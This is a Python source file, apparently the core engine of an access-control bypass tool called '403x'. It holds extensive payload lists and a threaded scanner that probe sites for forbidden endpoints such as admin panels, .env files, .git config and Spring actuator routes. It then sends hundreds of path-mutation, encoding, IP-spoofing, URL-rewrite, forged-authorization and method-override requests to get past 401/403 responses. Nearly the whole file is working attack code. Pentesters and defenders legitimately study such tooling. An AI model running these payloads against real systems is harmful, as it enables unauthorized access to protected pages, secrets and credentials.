"""
403x - Advanced 403 Bypass Recon Framework
Core bypass engine — Full payload edition

Bypass categories:
  1. Path suffix/prefix manipulation  (60+ variants)
  2. Extension appending              (40+ extensions)
  3. Encoding tricks                  (15+ encodings)
  4. Case & unicode mutations         (8 variants)
  5. Traversal & parser tricks        (20+ variants)
  6. Header injection                 (70+ header sets)
  7. HTTP method override             (12 methods + override headers)
  8. Protocol / port variation
  9. Query string injection
  10. Content-Type / Accept tricks
"""

import requests
import urllib3
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════
#  AUTO-DISCOVERY: common sensitive paths
# ═══════════════════════════════════════════════════════════════
COMMON_PATHS = [
    # Admin / management
    "/admin", "/admin/", "/administrator", "/administrator/",
    "/adminpanel", "/admin-panel", "/admin_panel",
    "/dashboard", "/dashboard/", "/panel", "/cpanel",
    "/controlpanel", "/control-panel", "/manage", "/management",
    "/manager", "/console", "/webconsole",
    # API
    "/api/private", "/api/admin", "/api/internal",
    "/api/v1/admin", "/api/v2/admin", "/api/v3/admin",
    "/api/v1/internal", "/api/v1/private", "/api/v1/users",
    "/api/debug", "/api/config", "/api/metrics",
    # Internals
    "/internal", "/internal/", "/private", "/private/",
    "/restricted", "/hidden", "/secret", "/secrets",
    "/config", "/configuration", "/settings",
    # Infra / DevOps
    "/actuator", "/actuator/env", "/actuator/health",
    "/actuator/info", "/actuator/mappings", "/actuator/beans",
    "/actuator/httptrace", "/actuator/loggers",
    "/health", "/healthcheck", "/health/live", "/health/ready",
    "/metrics", "/prometheus", "/status", "/monitor",
    "/monitoring", "/debug", "/debug/", "/trace",
    # Files / backup
    "/.env", "/.env.local", "/.env.production",
    "/.git", "/.git/config", "/.svn",
    "/backup", "/backups", "/bak", "/old",
    "/db", "/database", "/dump",
    # CMS / frameworks
    "/wp-admin", "/wp-login.php", "/wp-config.php",
    "/phpmyadmin", "/adminer.php", "/xmlrpc.php",
    "/joomla/administrator", "/drupal/admin",
    # Java / Spring
    "/env", "/beans", "/mappings", "/info",
    # Dev / staging
    "/dev", "/development", "/staging", "/test", "/qa",
    "/swagger", "/swagger-ui", "/swagger-ui.html",
    "/api-docs", "/openapi", "/redoc",
    # Logs
    "/logs", "/log", "/error_log", "/access_log",
    # User mgmt
    "/users", "/user/admin", "/accounts", "/account",
    "/profile", "/register", "/signup",
    # Cloud / k8s
    "/v1/api", "/v1/namespaces", "/_cluster/health",
    "/_cat/indices", "/_nodes",
    # Server status
    "/server-status", "/server-info", "/nginx_status",
    "/php-fpm-status", "/fpm-status",
]

# ═══════════════════════════════════════════════════════════════
#  PATH SUFFIXES
# ═══════════════════════════════════════════════════════════════
PATH_SUFFIXES = [
    # Slash / dot variants
    "/", "//", "///", "/.", "/./", "/..", "/../",
    "/..;/", "/.;/", "/..%2f", "/..%5c",
    "/%2f", "/%2f/",
    # Whitespace / invisible chars
    "%20", "%09", "%0a", "%0d", "%0d%0a",
    "%00", "%01", "%07", "%1f", "%ff",
    " ", "\t",
    # Terminators / tricks
    "?", "??", "?anything=1", "?debug=true", "?test=1",
    "?id=1", "?a=", "#", ";", ";;", ";/", ";a",
    "..;", "..;/", "...;/", "~", "`", ".", "..",
    # Extension appending
    ".json", ".html", ".htm", ".php", ".asp", ".aspx",
    ".jsp", ".jspx", ".js", ".css", ".xml", ".txt",
    ".csv", ".yaml", ".yml", ".config", ".ini", ".log",
    ".bak", ".old", ".orig", ".backup", ".1", ".2",
    ".copy", ".tmp", ".temp", ".save", ".swp",
    ".pdf", ".gif", ".png", ".jpg", ".jpeg", ".ico",
    ".svg", ".woff", ".woff2", ".ttf", ".eot",
    ".mp3", ".mp4", ".webm", ".rss", ".atom",
    ".do", ".action", ".rb", ".py", ".pl", ".cgi",
    ".exe", ".bin", ".zip", ".tar.gz", ".7z",
    ".fake.js",
    # Sensitive backup patterns
    ".env.bak", ".env.old", ".env~", ".env.txt",
    ".env.save", ".env.production", ".env.local",
    ".env.php", ".env.html",
    "~", "#",
]

# ═══════════════════════════════════════════════════════════════
#  PATH PREFIXES
# ═══════════════════════════════════════════════════════════════
PATH_PREFIXES = [
    "/", "//", "///", "/./", "/../", "/;/",
    "/%2e/", "/%2e%2e/", "/%252e/", "/%2f/",
    "/%5c/", "/%255c/", "/%2e%2f/", "/%2e%5c/",
    "/%c0%af/", "/%c1%9c/",
    "/..%2f", "/%2e%2e%2f", "/././",
]

# ═══════════════════════════════════════════════════════════════
#  MID-PATH INSERTIONS
# ═══════════════════════════════════════════════════════════════
MID_PATH_INSERTS = [
    "/./", "/../", "/;/", "//", "/%20/", "/%09/",
    "/..;/", "/.;/", "/%2e/", "/%2f", "/%5c",
]

# ═══════════════════════════════════════════════════════════════
#  HEADER BYPASS PAYLOADS
# ═══════════════════════════════════════════════════════════════
_SPOOF_IPS = [
    "127.0.0.1", "127.1", "localhost", "0.0.0.0", "0",
    "10.0.0.1", "10.0.0.0", "172.16.0.1", "192.168.1.1",
    "::1", "127.0.0.1, 127.0.0.2", "127.0.0.1:80",
    "127.0.0.1%00", "root", "admin", "internal",
]


def _build_header_sets() -> list[dict]:
    sets = []

    # IP-spoofing headers
    IP_HEADERS = [
        "X-Forwarded-For", "X-Forwarded", "X-Forwarded-Host",
        "X-Forwarded-Server", "X-Originating-IP", "X-Remote-IP",
        "X-Remote-Addr", "X-Client-IP", "X-Host", "X-Real-IP",
        "X-Custom-IP-Authorization", "X-Cluster-Client-IP",
        "X-ProxyUser-Ip", "True-Client-IP", "CF-Connecting-IP",
        "Fastly-Client-IP", "X-Azure-ClientIP", "X-Azure-SocketIP",
        "Forwarded", "Via", "Contact", "X-Wap-Profile",
        "X-Arbitrary", "X-HTTP-DestinationURL", "X-Backend-Host",
        "Base-Url", "Http-Url", "Proxy-Host", "Proxy-Url",
        "Redirect", "Referer", "Request-Uri", "Uri", "Url",
        "X-Has-Cache", "X-Requested-With", "X-Server-IP",
    ]
    for header in IP_HEADERS:
        for ip in _SPOOF_IPS:
            val = f"for={ip}" if header == "Forwarded" else ip
            sets.append({header: val})

    # URL / path rewrite headers
    PATH_REWRITE_HEADERS = [
        "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Path",
        "X-Override-URL", "X-Proxy-URL", "X-Servlet-Path",
        "X-Request-URI", "X-Path-Info", "X-Original-URI",
    ]
    path_values = [
        "{path}", "/", "/.", "/..;{path}", "/;{path}", "//",
        "{path}/.", "{path}//", "{path}%20", "{path}%09",
        "{path};", "{path}?", "/%2e{path}", "/%2f{path}",
    ]
    for header in PATH_REWRITE_HEADERS:
        for val in path_values:
            sets.append({header: val})

    # HTTP method override headers
    METHOD_OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override", "X-Method-Override",
        "X-Original-Method", "_method",
    ]
    override_methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]
    for header in METHOD_OVERRIDE_HEADERS:
        for method in override_methods:
            sets.append({header: method})

    # Scheme / protocol tricks
    sets += [
        {"X-Forwarded-Proto": "https"}, {"X-Forwarded-Proto": "http"},
        {"X-Forwarded-Scheme": "https"}, {"X-Forwarded-Scheme": "http"},
        {"X-Scheme": "https"}, {"X-Scheme": "http"},
        {"Front-End-Https": "on"}, {"X-Ssl": "1"},
    ]

    # Port tricks
    sets += [
        {"X-Forwarded-Port": "443"}, {"X-Forwarded-Port": "80"},
        {"X-Forwarded-Port": "8080"}, {"X-Forwarded-Port": "8443"},
        {"X-Forwarded-Port": "3000"},
    ]

    # Auth / role spoofing
    sets += [
        {"Authorization": "Bearer admin"},
        {"Authorization": "Bearer null"},
        {"Authorization": "Basic YWRtaW46YWRtaW4="},
        {"Authorization": "Basic YWRtaW46"},
        {"X-Auth-Token": "admin"},
        {"X-Auth-User": "admin"},
        {"X-Admin": "true"}, {"X-Admin": "1"},
        {"X-Is-Admin": "true"},
        {"X-Role": "admin"}, {"X-User-Role": "admin"},
        {"X-Roles": "admin"}, {"X-User-Groups": "admin"},
        {"X-User-ID": "1"}, {"X-User-ID": "0"},
        {"Cookie": "admin=true"}, {"Cookie": "role=admin"},
        {"Cookie": "isAdmin=true"}, {"Cookie": "session=admin"},
    ]

    # Content-Type tricks
    sets += [
        {"Content-Type": "application/json"},
        {"Content-Type": "application/x-www-form-urlencoded"},
        {"Content-Type": "text/xml"},
        {"Content-Type": "application/xml"},
    ]

    # Accept tricks
    sets += [
        {"Accept": "application/json"},
        {"Accept": "text/html,application/xhtml+xml"},
        {"Accept": "*/*"},
        {"Accept": "application/xml"},
    ]

    # Hop-by-hop / internal tricks
    sets += [
        {"Connection": "close", "Upgrade-Insecure-Requests": "1"},
        {"Cache-Control": "no-cache"}, {"Pragma": "no-cache"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.1"},
        {"X-Requested-With": "XMLHttpRequest"},
        {"X-Requested-With": "XMLHttpRequest", "X-Forwarded-For": "127.0.0.1"},
        {"X-WAP-Profile": "http://127.0.0.1/wap"},
        {"Profile": "http://127.0.0.1/"},
        {"Destination": "127.0.0.1"},
        {"X-Backend-Host": "localhost"}, {"X-Backend-Host": "127.0.0.1"},
        {"X-Internal-Token": "internal"}, {"X-Internal": "true"},
        {"X-Debug": "true"}, {"X-Api-Version": "internal"},
        {"X-Bypass": "true"},
        {"X-Original-URL": "{path}", "X-Forwarded-For": "127.0.0.1"},
        {"X-Original-URL": "{path}", "X-Real-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1", "X-Custom-IP-Authorization": "127.0.0.1"},
        {"Host": "localhost"}, {"Host": "127.0.0.1"},
        {"Host": "internal"}, {"Host": "admin"},
    ]

    return sets


HEADER_BYPASS_SETS = _build_header_sets()

# ═══════════════════════════════════════════════════════════════
#  HTTP METHODS
# ═══════════════════════════════════════════════════════════════
METHOD_BYPASSES = [
    "GET", "POST", "PUT", "PATCH", "DELETE",
    "OPTIONS", "HEAD", "TRACE", "CONNECT",
    "PROPFIND", "PROPPATCH", "MKCOL",
]


# ═══════════════════════════════════════════════════════════════
#  PATH BYPASS GENERATOR
# ═══════════════════════════════════════════════════════════════
def generate_path_bypasses(path: str) -> list[tuple[str, str]]:
    p    = path.rstrip("/")
    leaf = p.split("/")[-1] if "/" in p else p.lstrip("/")
    pdir = "/".join(p.split("/")[:-1]) if "/" in p else ""
    bare = p.lstrip("/")

    variants: list[tuple[str, str]] = []

    # 1. Suffix appending
    for suffix in PATH_SUFFIXES:
        variants.append((f"suffix:{suffix!r}", f"{p}{suffix}"))

    # 2. Prefix injections
    for prefix in PATH_PREFIXES:
        variants.append((f"prefix:{prefix!r}", f"{prefix}{bare}"))

    # 3. Mid-path injections
    if pdir:
        for ins in MID_PATH_INSERTS:
            variants.append((f"midpath:{ins!r}", f"{pdir}{ins}{leaf}"))

    # 4. Case mutations
    variants += [
        ("case:upper",     p.upper()),
        ("case:lower",     p.lower()),
        ("case:title",     p.title()),
        ("case:swap",      p.swapcase()),
        ("case:alternate", "".join(
            c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)
        )),
    ]

    # 5. Double/triple slash
    variants += [
        ("dblslash:prepend",    f"//{bare}"),
        ("dblslash:append",     f"{p}//"),
        ("tripleslash:prepend", f"///{bare}"),
    ]

    # 6. Encoded slash
    if "/" in bare:
        variants += [
            ("encode:slash-first", bare.replace("/", "%2f", 1)),
            ("encode:slash-all",   bare.replace("/", "%2f")),
            ("encode:dblenc-slash", bare.replace("/", "%252f")),
            ("encode:backslash",   bare.replace("/", "%5c")),
            ("encode:dblenc-back", bare.replace("/", "%255c")),
        ]

    # 7. Dot segment normalization
    variants += [
        ("dot:single-before", f"{pdir}/./{leaf}" if pdir else f"/./{leaf}"),
        ("dot:double-before", f"{pdir}/../{leaf}" if pdir else f"/../{leaf}"),
        ("dot:trailing",      f"{p}/."),
        ("dot:trailslash",    f"{p}/./"),
        ("dot:urlenc",        f"{pdir}/%2e/{leaf}" if pdir else f"/%2e/{leaf}"),
        ("dot:dotdot-urlenc", f"{pdir}/%2e%2e/{leaf}" if pdir else f"/%2e%2e/{leaf}"),
        ("dot:dblenc",        f"{pdir}/%252e/{leaf}" if pdir else f"/%252e/{leaf}"),
    ]

    # 8. Semicolon injection (Tomcat/Spring path parameter)
    variants += [
        ("semi:prefix",    f"/;{bare}"),
        ("semi:mid",       f"{pdir}/;/{leaf}" if pdir else f"/;/{leaf}"),
        ("semi:suffix",    f"{p};"),
        ("semi:valueless", f"{p};a"),
        ("semi:dotdot",    f"{p}..;/"),
        ("semi:dotdot2",   f"{pdir}/..;/{leaf}" if pdir else f"/..;/{leaf}"),
    ]

    # 9. Null / CRLF
    variants += [
        ("null:path",   f"{p}%00"),
        ("null:mid",    f"{pdir}%00/{leaf}" if pdir else f"%00/{leaf}"),
        ("crlf:suffix", f"{p}%0d%0a"),
    ]

    # 10. Unicode / overlong UTF-8
    variants += [
        ("unicode:slash",     p.replace("/", "\u2215")),
        ("unicode:backslash", p.replace("/", "\u005c")),
        ("overlong:af",       p.replace("/", "%c0%af")),
        ("overlong:9c",       p.replace("/", "%c1%9c")),
        ("overlong:e0-80",    p.replace("/", "%e0%80%af")),
    ]

    # 11. Wildcard
    variants += [
        ("wildcard:star",     f"{p}/*"),
        ("wildcard:question", f"{p}/?"),
    ]

    # 12. Absolute URL in path
    variants += [
        ("abs:http",  f"http:{p}"),
        ("abs:https", f"https:{p}"),
    ]

    # 13. Sensitive files
    for f in ["web.config", "settings.py", "config.php.bak", ".htaccess", "robots.txt"]:
        variants.append((f"file:{f}", f"{p}/{f}"))

    # Deduplicate
    seen = set()
    deduped = []
    for label, variant in variants:
        if variant not in seen:
            seen.add(variant)
            deduped.append((label, variant))
    return deduped


# ═══════════════════════════════════════════════════════════════
#  RESULT TYPE
# ═══════════════════════════════════════════════════════════════
@dataclass
class BypassResult:
    url:            str
    technique:      str
    status_code:    int
    content_length: int
    bypass:         bool
    headers_used:   dict = field(default_factory=dict)
    note:           str  = ""


BYPASS_CODES = {200, 201, 202, 204, 301, 302, 307, 308}
TARGET_CODES = {401, 403}


# ═══════════════════════════════════════════════════════════════
#  SCANNER
# ═══════════════════════════════════════════════════════════════
class Scanner:
    def __init__(
        self,
        threads:       int           = 30,
        timeout:       int           = 10,
        proxy:         Optional[str] = None,
        delay:         float         = 0,
        user_agent:    str           = "403x/1.0 (Security Research)",
        verify_ssl:    bool          = False,
        max_per_target: int          = 0,
    ):
        self.threads         = threads
        self.timeout         = timeout
        self.proxy           = {"http": proxy, "https": proxy} if proxy else None
        self.delay           = delay
        self.verify_ssl      = verify_ssl
        self.max_per_target  = max_per_target
        self.base_headers    = {"User-Agent": user_agent, "Accept": "*/*"}
        self.session         = requests.Session()
        self.session.verify  = verify_ssl
        if self.proxy:
            self.session.proxies = self.proxy

    def _request(self, method: str, url: str, headers: dict) -> Optional[requests.Response]:
        try:
            resp = self.session.request(
                method, url,
                headers={**self.base_headers, **headers},
                timeout=self.timeout,
                allow_redirects=False,
                verify=self.verify_ssl,
            )
            if self.delay:
                time.sleep(self.delay)
            return resp
        except Exception:
            return None

    def _make_result(self, url, technique, resp, headers=None):
        if resp is None:
            return None
        return BypassResult(
            url=url, technique=technique,
            status_code=resp.status_code,
            content_length=len(resp.content),
            bypass=resp.status_code in BYPASS_CODES,
            headers_used=headers or {},
        )

    def probe(self, url: str) -> Optional[int]:
        resp = self._request("GET", url, {})
        return resp.status_code if resp else None

    def _bypass_url(self, url: str) -> list[BypassResult]:
        results = []
        parsed  = urlparse(url)
        path    = parsed.path or "/"
        origin  = f"{parsed.scheme}://{parsed.netloc}"
        found   = 0
        limit   = self.max_per_target

        def _add(r):
            nonlocal found
            if r:
                results.append(r)
                if r.bypass:
                    found += 1

        # 1. Path manipulation
        for label, new_path in generate_path_bypasses(path):
            if limit and found >= limit:
                break
            _add(self._make_result(
                f"{origin}{new_path}", f"path:{label}",
                self._request("GET", f"{origin}{new_path}", {}),
            ))

        # 2. Header injection
        for hset in HEADER_BYPASS_SETS:
            if limit and found >= limit:
                break
            filled = {k: v.replace("{path}", path) for k, v in hset.items()}
            label  = "hdr:" + "+".join(f"{k}={v[:18]}" for k, v in filled.items())
            _add(self._make_result(url, label, self._request("GET", url, filled), filled))

        # 3. HTTP methods
        for method in METHOD_BYPASSES:
            if limit and found >= limit:
                break
            _add(self._make_result(url, f"method:{method}",
                                   self._request(method, url, {})))

        # 4. Protocol
        for scheme in ("http", "https"):
            alt = url.replace(parsed.scheme, scheme, 1)
            if alt != url:
                _add(self._make_result(alt, f"scheme:{scheme}",
                                       self._request("GET", alt, {})))

        # 5. Port variations
        for port in (80, 443, 8080, 8443, 8000, 3000):
            if str(port) not in parsed.netloc:
                host    = parsed.netloc.split(":")[0]
                alt_url = f"{parsed.scheme}://{host}:{port}{path}"
                if alt_url != url:
                    _add(self._make_result(alt_url, f"port:{port}",
                                           self._request("GET", alt_url, {})))

        return results

    def scan_url(self, url: str, force: bool = False) -> tuple[int, list[BypassResult]]:
        code = self.probe(url)
        if code is None:
            return (0, [])
        if not force and code not in TARGET_CODES:
            return (code, [])
        return (code, self._bypass_url(url))

    def discover_endpoints(self, base_url: str) -> list[str]:
        parsed     = urlparse(base_url)
        origin     = f"{parsed.scheme}://{parsed.netloc}"
        discovered = []
        def check(path):
            u = urljoin(origin, path)
            if self.probe(u) in TARGET_CODES:
                discovered.append(u)
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(check, COMMON_PATHS))
        return discovered

    def scan_many(self, urls, force=False, progress_cb=None):
        results = {}
        def worker(url):
            code, bypasses = self.scan_url(url, force=force)
            if progress_cb:
                progress_cb(url, code, bypasses)
            return url, code, bypasses
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(worker, u): u for u in urls}
            for fut in as_completed(futures):
                url, code, bypasses = fut.result()
                results[url] = (code, bypasses)
        return results


def payload_stats() -> dict:
    path_count   = len(generate_path_bypasses("/admin"))
    header_count = len(HEADER_BYPASS_SETS)
    method_count = len(METHOD_BYPASSES)
    total        = path_count + header_count + method_count + 2 + 6
    return {
        "path_variants":  path_count,
        "header_sets":    header_count,
        "methods":        method_count,
        "protocol":       2,
        "port_variants":  6,
        "total_per_url":  total,
    }
